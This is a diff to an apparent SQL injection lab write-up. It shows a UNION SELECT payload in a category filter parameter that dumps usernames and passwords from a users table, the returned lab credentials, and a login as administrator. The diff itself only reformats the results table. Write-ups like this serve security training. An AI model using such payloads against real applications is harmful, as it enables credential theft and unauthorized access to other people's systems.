@@ -23,9 +23,9 @@ I got an error at 3, so the original query returns 2 columns.
 Then I crafted this payload and injected it to retrieve the usernames and passwords from the `users` table:
 `filter?category=NULL' UNION SELECT username, password FROM users--`
 It returned this:
-|----------------|-------------------------|
-| carlos         | wdx34haxptca1rb7caqs    |
-| wiener         | e88jked15ttmw9uum39n    |
-| administrator  | pc813hty2fgeufhmqmik    |
+
+ carlos         | wdx34haxptca1rb7caqs   
+ wiener         | e88jked15ttmw9uum39n   
+ administrator  | pc813hty2fgeufhmqmik   
 
 So I logged in as administrator using the credentials and finished the lab.
